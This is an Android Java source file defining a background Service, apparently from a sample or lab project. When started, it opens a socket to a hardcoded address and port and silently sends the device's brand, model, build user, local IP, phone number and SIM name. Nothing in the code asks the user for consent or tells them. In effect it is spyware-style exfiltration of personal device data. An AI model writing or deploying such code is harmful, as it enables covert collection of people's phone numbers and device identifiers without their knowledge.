package com.example.myapplication;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.IBinder;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;

public class MyService extends Service {

    private boolean ONLINE_FLAG = false;
    private final String LOG_TAG = "ServiceLog";
    private final String DST_ADDRESS = "192.168.0.35";
    private final int DST_PORT = 3333;
    private Socket socket;

    public MyService() {
    }

    @Override
    public void onCreate() {
        super.onCreate(); Log.d(LOG_TAG, "ON CREATE");

        ONLINE_FLAG = isOnline();
        Log.i(LOG_TAG, "Is Online? - " + ONLINE_FLAG);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(LOG_TAG, "ON START COMMAND");

        Thread socketThread = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    if (ONLINE_FLAG) {
                        if((socket = new Socket(DST_ADDRESS, DST_PORT)).isConnected()) {
                            Log.i(LOG_TAG, "Successfully connected");
                            PrintWriter printWriter = new PrintWriter(socket.getOutputStream());
                            printWriter.println("DEVICE INFO: \n" +
                                    "\tBRAND: " + Build.BRAND + "\n" +
                                    "\tMODEL: " + Build.MODEL + "\n" +
                                    "\tUSER: " + Build.USER + "\n" +
                                    "\tIPLocalAddress: " + socket.getLocalAddress() + "\n" +
                                    "\tPHONE NUMBER: " + MainActivity.deviceData[0] + "\n" +
                                    "\tSIM NAME: " + MainActivity.deviceData[1]
                            );
                            printWriter.flush();
                        }
                    }
                } catch (IOException e) {
                    Log.e(LOG_TAG, e.getMessage());
                }
            }
        });

        socketThread.start();

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(LOG_TAG, "ON DESTROY");
    }

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    private boolean isOnline() {
        try {
            Process process = Runtime.getRuntime().exec("/system/bin/ping -c 1 8.8.8.8");
            int retStatus = process.waitFor();
            return (retStatus == 0);
        } catch (IOException e) {
            Log.e(LOG_TAG, e.getMessage());
        } catch (InterruptedException e) {
            Log.e(LOG_TAG, e.getMessage());
        }
        return false;
    }
}
